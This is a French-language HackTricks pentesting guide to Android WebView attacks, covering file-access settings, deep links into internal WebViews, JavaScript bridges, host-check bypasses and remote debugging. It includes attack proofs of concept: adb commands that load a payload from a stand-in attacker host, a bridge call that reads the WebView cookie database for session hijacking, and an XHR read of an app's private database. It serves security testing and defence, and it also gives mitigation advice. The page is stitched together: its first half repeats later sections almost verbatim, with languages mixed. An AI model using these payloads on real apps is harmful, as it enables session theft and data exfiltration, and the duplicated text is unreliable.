# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Un aspect critique du développement Android concerne la bonne gestion des WebViews. Ce guide met en avant les configurations clés et les bonnes pratiques de sécurité pour atténuer les risques liés à l'utilisation des WebViews.

![Exemple de WebView](<../../images/image (1190).png>)

### **File Access in WebViews**

Par défaut, les WebViews autorisent l'accès aux fichiers. Cette fonctionnalité est contrôlée par la méthode `setAllowFileAccess()`, disponible depuis Android API level 3 (Cupcake 1.5). Les applications disposant de la permission **android.permission.READ_EXTERNAL_STORAGE** peuvent lire des fichiers depuis le stockage externe en utilisant le schéma d'URL file (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Cette fonctionnalité obsolète permettait des requêtes cross-origin depuis des file URLs, posant un risque de sécurité important à cause de potentielles attaques XSS. Le réglage par défaut est désactivé (`false`) pour les apps ciblant Android Jelly Bean et versions ultérieures.
- Pour vérifier ce réglage, utilisez `getAllowUniversalAccessFromFileURLs()`.
- Pour modifier ce réglage, utilisez `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Cette fonctionnalité, également obsolète, contrôlait l'accès au contenu depuis d'autres URLs avec le schéma file. Comme pour l'accès universel, son mode par défaut est désactivé pour renforcer la sécurité.
- Utilisez `getAllowFileAccessFromFileURLs()` pour vérifier et `setAllowFileAccessFromFileURLs(boolean)` pour définir.

#### **Secure File Loading**

Pour désactiver l'accès au système de fichiers tout en continuant d'accéder aux assets et resources, on utilise la méthode `setAllowFileAccess()`. À partir d'Android R, le réglage par défaut est `false`.

- Vérifiez avec `getAllowFileAccess()`.
- Activez ou désactivez avec `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** est l'approche moderne pour charger des fichiers locaux. Elle utilise des URLs http(s) pour accéder aux assets et resources locaux, en respectant la Same-Origin policy, facilitant ainsi la gestion du CORS.

### loadUrl

Il s'agit d'une fonction couramment utilisée pour charger des URLs arbitraires dans un WebView:
```java
webview.loadUrl("<url here>")
```
Bien sûr, un attaquant potentiel ne devrait jamais pouvoir **contrôler l'URL** que l'application va charger.

### **Gestion de JavaScript et du Intent Scheme**

- **JavaScript**: Désactivé par défaut dans les WebViews, il peut être activé via `setJavaScriptEnabled()`. La prudence est de mise car activer JavaScript sans protections appropriées peut introduire des vulnérabilités de sécurité.
- **Intent Scheme**: Les WebViews peuvent gérer le schéma `intent`, ce qui peut conduire à des exploitations si ce n'est pas correctement géré. Un exemple de vulnérabilité impliquait un paramètre exposé de WebView "support_url" qui pouvait être exploité pour exécuter des attaques cross-site scripting (XSS).

![WebView vulnérable](<../../images/image (1191).png>)

Exemple d'exploitation en utilisant adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android fournit une fonctionnalité qui permet au **JavaScript** dans une WebView d'appeler des **fonctions natives d'une application Android**. Cela se fait en utilisant la méthode `addJavascriptInterface`, qui intègre JavaScript aux fonctionnalités natives d'Android, appelée _WebView JavaScript bridge_. Il convient d'être prudent car cette méthode permet à toutes les pages contenues dans la WebView d'accéder à l'objet JavaScript Interface enregistré, ce qui constitue un risque de sécurité si des informations sensibles sont exposées via ces interfaces.

- **Une extrême prudence est requise** pour les applications ciblant des versions d'Android antérieures à 4.2 en raison d'une vulnérabilité permettant l'exécution de code à distance via du JavaScript malveillant, exploitant la reflection.

#### Implementing a JavaScript Bridge

- **Les interfaces JavaScript** peuvent interagir avec le code natif, comme le montrent les exemples où une méthode de classe est exposée à JavaScript :
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge est activé en ajoutant une interface au WebView :
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Une exploitation potentielle via JavaScript, par exemple via une attaque XSS, permet d'appeler des méthodes Java exposées :
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Pour atténuer les risques, **restreindre l'utilisation du JavaScript bridge** au code fourni avec l'APK et empêcher le chargement de JavaScript depuis des sources distantes. Pour les appareils plus anciens, définissez le niveau d'API minimum sur 17.

### Reflection-based Remote Code Execution (RCE)

- Une méthode documentée permet d'obtenir RCE via reflection en exécutant un payload spécifique. Cependant, l'annotation `@JavascriptInterface` empêche l'accès non autorisé aux méthodes, limitant la surface d'attaque.

### Remote Debugging

- **Remote debugging** est possible avec **Chrome Developer Tools**, permettant l'interaction et l'exécution arbitraire de JavaScript dans le contenu de la WebView.

#### Enabling Remote Debugging

- Le Remote debugging peut être activé pour toutes les WebViews au sein d'une application en:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Pour activer le debugging de manière conditionnelle en fonction de l'état debuggable de l'application :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- Démontre l'exfiltration de fichiers arbitraires en utilisant un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Attaques WebView

## Guide sur les configurations et la sécurité des WebView

### Aperçu des vulnérabilités des WebView

Un aspect critique du développement Android concerne la gestion correcte des WebView. Ce guide met en évidence les configurations clés et les bonnes pratiques de sécurité pour atténuer les risques liés à l'utilisation des WebView.

![Exemple de WebView](<../../images/image (1190).png>)

### **Accès aux fichiers dans les WebView**

Par défaut, les WebView permettent l'accès aux fichiers. Cette fonctionnalité est contrôlée par la méthode `setAllowFileAccess()`, disponible depuis Android API level 3 (Cupcake 1.5). Les applications disposant de la permission **android.permission.READ_EXTERNAL_STORAGE** peuvent lire des fichiers depuis le stockage externe en utilisant le schéma d'URL file (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Cette fonctionnalité dépréciée permettait des requêtes cross-origin depuis des URLs file, présentant un risque de sécurité important dû à d'éventuelles attaques XSS. Le réglage par défaut est désactivé (`false`) pour les applications ciblant Android Jelly Bean et versions ultérieures.
- Pour vérifier ce réglage, utilisez `getAllowUniversalAccessFromFileURLs()`.
- Pour modifier ce réglage, utilisez `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Cette fonctionnalité, également dépréciée, contrôlait l'accès au contenu depuis d'autres URLs au schéma file. Comme pour l'accès universel, son paramètre par défaut est désactivé pour renforcer la sécurité.
- Utilisez `getAllowFileAccessFromFileURLs()` pour vérifier et `setAllowFileAccessFromFileURLs(boolean)` pour définir.

#### **Chargement sécurisé des fichiers**

Pour désactiver l'accès au système de fichiers tout en continuant d'accéder aux assets et aux ressources, on utilise la méthode `setAllowFileAccess()`. Avec Android R et versions supérieures, le réglage par défaut est `false`.

- Vérifiez avec `getAllowFileAccess()`.
- Activez ou désactivez avec `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** est l'approche moderne pour charger des fichiers locaux. Elle utilise des http(s) URLs pour accéder aux assets et aux ressources locales, en s'alignant sur la Same-Origin policy, facilitant ainsi la gestion du CORS.

### loadUrl

This is a common function used to load arbitrary URLs in a WebView:
```java
webview.loadUrl("<url here>")
```
Évidemment, un attaquant potentiel ne devrait jamais pouvoir **contrôler l'URL** que l'application va charger.

### Deep-linking into internal WebView (custom scheme → WebView sink)

De nombreuses applications enregistrent des custom schemes/paths qui dirigent une URL fournie par l'utilisateur vers un WebView intégré. Si le deep link est exporté (VIEW + BROWSABLE), un attaquant peut forcer l'application à afficher du contenu distant arbitraire à l'intérieur de son contexte WebView.

Patron typique du manifest (simplifié) :
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Flux de code courant (simplifié) :
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Modèle d'attaque et PoC via adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact : la page distante s'exécute dans le contexte WebView de l'app (cookies/session du profil WebView de l'app, accès à tout @JavascriptInterface exposé, accès potentiel à content:// et file:// selon les paramètres).

Hunting tips:
- Grep les sources décompilées pour `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, and deep-link handlers (`onCreate/onNewIntent`).
- Review the manifest for VIEW+BROWSABLE filters and custom schemes/hosts that map to activities that later start a WebView.
- Check if there are multiple deep-link paths (e.g., an “external browser” path vs. an “internal webview” path) and prefer the one that renders inside the app.

### Enabling JavaScript before verification (order-of-checks bug)

Une erreur fréquente de hardening est d'activer JavaScript ou de configurer des paramètres WebView permissifs avant que la allowlist/verification finale de l'URL cible ne soit terminée. Si la vérification est incohérente entre les helpers ou se produit trop tard, un deep link d'attaquant peut atteindre un état où :

1) Les paramètres WebView s'appliquent (p.ex., `setJavaScriptEnabled(true)`), et
2) L'URL non fiable est chargée avec JavaScript activé.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Pourquoi c'est exploitable
- Normalisation incohérente : des fonctions utilitaires divisent/reconstruisent l'URL différemment par rapport à la vérification finale, créant des discordances qu'une URL malveillante peut exploiter.
- Pipeline mal ordonné : activer JS à l'étape 2 s'applique globalement à l'instance WebView, affectant le chargement final même si la vérification échouait ensuite.

How to test
- Concevez des payloads deep-link qui passent les vérifications initiales et atteignent le site de configuration de la WebView.
- Utilisez adb pour envoyer des implicit VIEW intents fournissant un paramètre `url=` contrôlé par vous:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Si l'exploitation réussit, votre payload exécute du JavaScript dans le WebView de l'application. À partir de là, recherchez des bridges exposés :
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Defensive guidance
- Effectuer la canonicalisation une seule fois ; valider strictement par rapport à une seule source de vérité (scheme/host/path/query).
- N'appelez `setJavaScriptEnabled(true)` qu'après le passage de toutes les vérifications d'allowlist et juste avant de charger du contenu de confiance.
- Évitez d'exposer `@JavascriptInterface` à des origines non fiables ; privilégiez un contrôle par origine.
- Envisagez d'utiliser des instances WebView distinctes pour le contenu de confiance et non fiable, avec JavaScript désactivé par défaut.

### **JavaScript et gestion du Intent Scheme**

- **JavaScript** : Désactivé par défaut dans les WebViews, il peut être activé via `setJavaScriptEnabled()`. La prudence est de mise : activer JavaScript sans protections appropriées peut introduire des vulnérabilités de sécurité.
- **Intent Scheme** : Les WebViews peuvent gérer le schéma `intent`, ce qui peut conduire à des exploits si ce n'est pas géré avec soin. Un exemple de vulnérabilité impliquait un paramètre WebView exposé "support_url" qui pouvait être exploité pour exécuter des attaques cross-site scripting (XSS).

![Vulnerable WebView](<../../images/image (1191).png>)

Exploitation example using adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Pont JavaScript

Android propose une fonctionnalité qui permet au **JavaScript** dans un WebView d'invoquer des **fonctions natives de l'application Android**. Cela se fait via la méthode `addJavascriptInterface`, qui intègre JavaScript aux fonctionnalités natives d'Android, appelée _WebView JavaScript bridge_. Il faut être prudent car cette méthode autorise toutes les pages du WebView à accéder à l'objet JavaScript Interface enregistré, ce qui représente un risque de sécurité si des informations sensibles sont exposées via ces interfaces.

- **Une extrême prudence est nécessaire** pour les apps ciblant les versions d'Android antérieures à 4.2 en raison d'une vulnérabilité permettant le remote code execution via du JavaScript malveillant exploitant la reflection.

#### Implémentation d'un Pont JavaScript

- **Les interfaces JavaScript** peuvent interagir avec le code natif, comme montré dans les exemples où une méthode de classe est exposée à JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge est activé en ajoutant une interface au WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Exploitation potentielle via JavaScript, par exemple une attaque XSS, permet d'appeler des méthodes Java exposées :
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Pour réduire les risques, **restreindre l'utilisation du JavaScript bridge** au code fourni avec l'APK et empêcher le chargement de JavaScript depuis des sources distantes. Pour les appareils plus anciens, définissez le niveau d'API minimum à 17.

#### Abuser des JS bridges de type dispatcher (invokeMethod/handlerName)

Un schéma courant est une seule méthode exportée (par ex., `@JavascriptInterface void invokeMethod(String json)`) qui désérialise du JSON contrôlé par l'attaquant en un objet générique et qui redirige l'exécution en fonction du nom du handler fourni. Forme typique du JSON :
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risque : si un handler enregistré effectue des actions privilégiées sur des données contrôlées par l'attaquant (par ex., lectures directes de fichiers), vous pouvez l'appeler en définissant `handlerName` en conséquence. Les résultats sont généralement renvoyés dans le contexte de la page via `evaluateJavascript` et un mécanisme callback/promise indexé par `callbackId`.

Key hunting steps
- Décompiler et utiliser grep sur `addJavascriptInterface(` pour connaître le nom de l'objet bridge (ex., `xbridge`).
- Dans Chrome DevTools (chrome://inspect), tapez le nom de l'objet bridge dans la Console (ex., `xbridge`) pour énumérer les champs/méthodes exposés ; cherchez un dispatcher générique comme `invokeMethod`.
- Énumérez les handlers en recherchant des classes implémentant `getModuleName()` ou des registration maps.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

Si un handler accepte une URI, appelle `Uri.parse(req.getUri()).getPath()`, construit `new File(...)` et le lit sans allowlists ni vérifications du sandbox, vous obtenez une lecture arbitraire de fichier dans le sandbox de l'app qui contourne les paramètres WebView comme `setAllowFileAccess(false)` (la lecture se fait dans le code natif, pas via le WebView network stack).

PoC to exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Remarques
- Les chemins de la DB des Cookies varient selon les appareils/fournisseurs. Exemples courants :
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- Le handler renvoie du Base64 ; décodez-le pour récupérer les Cookies et vous faire passer pour l'utilisateur dans le profil WebView de l'app.

Conseils de détection
- Surveillez les longues chaînes Base64 retournées via `evaluateJavascript` lors de l'utilisation de l'app.
- Grep les sources décompilées à la recherche de handlers qui acceptent `uri`/`path` et les convertissent en `new File(...)`.

#### Contourner les contrôles de privilège WebView – vérifications d'hôte avec endsWith()

Les décisions de privilège (sélection d'une JSB-enabled Activity) reposent souvent sur des allowlists d'hôtes. Un schéma défaillant est :
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Logique équivalente (De Morgan’s):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Ceci n'est pas une vérification d'origine. De nombreux hôtes non prévus satisfont la deuxième clause, permettant à des domaines non fiables d'entrer dans l'Activity privilégiée. Vérifiez toujours le schéma et l'hôte par rapport à une liste d'autorisation stricte (correspondance exacte ou vérification correcte des sous-domaines avec des délimitations par point), et non des astuces `endsWith`.

#### javascript:// execution primitive via loadUrl

Une fois dans un WebView privilégié, les applications exécutent parfois du JS inline via :
```java
webView.loadUrl("javascript:" + jsPayload);
```
Si un flux interne déclenche `loadUrl("javascript:...")` dans ce contexte, le JS injecté s'exécute avec un accès au bridge même si la page externe ne serait normalement pas autorisée. Pentest steps:
- Chercher avec grep `loadUrl("javascript:` et `evaluateJavascript(` dans l'application.
- Essayez d'atteindre ces chemins d'exécution après avoir forcé la navigation vers le WebView privilégié (p.ex., via un permissive deep link chooser).
- Utilisez ce primitive pour appeler le dispatcher (`xbridge.invokeMethod(...)`) et atteindre les handlers sensibles.

Mitigations (checklist pour développeurs)
- Vérification stricte de l'origine pour les Activities privilégiées : canonicalisez et comparez scheme/host avec une allowlist explicite ; évitez les vérifications basées sur `endsWith`. Envisagez Digital Asset Links lorsque applicable.
- Restreindre les bridges aux pages de confiance uniquement et revérifier la confiance à chaque appel (autorisation par appel).
- Supprimez ou protégez étroitement les handlers capables d'accéder au filesystem ; privilégiez `content://` avec allowlists/permissions plutôt que les chemins `file://` bruts.
- Évitez `loadUrl("javascript:")` dans les contextes privilégiés ou placez-le derrière des vérifications strictes.
- Rappelez-vous que `setAllowFileAccess(false)` ne protège pas contre les lectures de fichiers natives via le bridge.

#### JSB : conseils d'énumération et de débogage

- Activez le débogage à distance du WebView pour utiliser la console Chrome DevTools :
- Côté application (builds de debug) : `WebView.setWebContentsDebuggingEnabled(true)`
- Côté système : des modules comme [LSPosed](https://github.com/LSPosed/LSPosed) ou des scripts Frida peuvent activer de force le debugging même dans les builds release. Exemple Frida snippet pour Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- Dans DevTools, tapez le nom de l'objet bridge (p.ex., `xbridge`) pour voir les membres exposés et sonder le dispatcher.


### Exécution de code à distance (RCE) basée sur la réflexion

- Une méthode documentée permet d'obtenir une RCE via la réflexion en exécutant un payload spécifique. Cependant, l'annotation `@JavascriptInterface` empêche l'accès non autorisé aux méthodes, limitant la surface d'attaque.

### Débogage à distance

- **Le débogage à distance** est possible avec **Chrome Developer Tools**, permettant l'interaction et l'exécution arbitraire de JavaScript dans le contenu du WebView.

#### Activation du débogage à distance

- Le débogage à distance peut être activé pour tous les WebViews d'une application en :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Pour activer conditionnellement le debugging en fonction de l'état debuggable de l'application :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrer des fichiers arbitraires

- Démontre l'exfiltration de fichiers arbitraires en utilisant un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Références

- [Revue des vecteurs d'attaque d'accès aux fichiers d'Android WebViews](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (application de démonstration)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Référence Android WebView](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Partie II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Partie I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 — Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (livre blanc)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Vidéo de démonstration](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Prise de contrôle de compte dans une application Android via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – activer le débogage WebView](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
